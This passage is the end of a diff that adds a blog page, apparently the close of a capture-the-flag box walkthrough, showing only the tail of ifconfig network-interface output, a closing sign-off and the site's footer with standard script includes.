+          TX packets:966 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:112891 <span class="o">(</span>112.8 KB<span class="o">)</span>  TX bytes:144670 <span class="o">(</span>144.6 KB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:180 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:13040 <span class="o">(</span>13.0 KB<span class="o">)</span>  TX bytes:13040 <span class="o">(</span>13.0 KB<span class="o">)</span>
+</code></pre></div></div> <p>And with that, that is the end of the box. Go forth and conquer.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
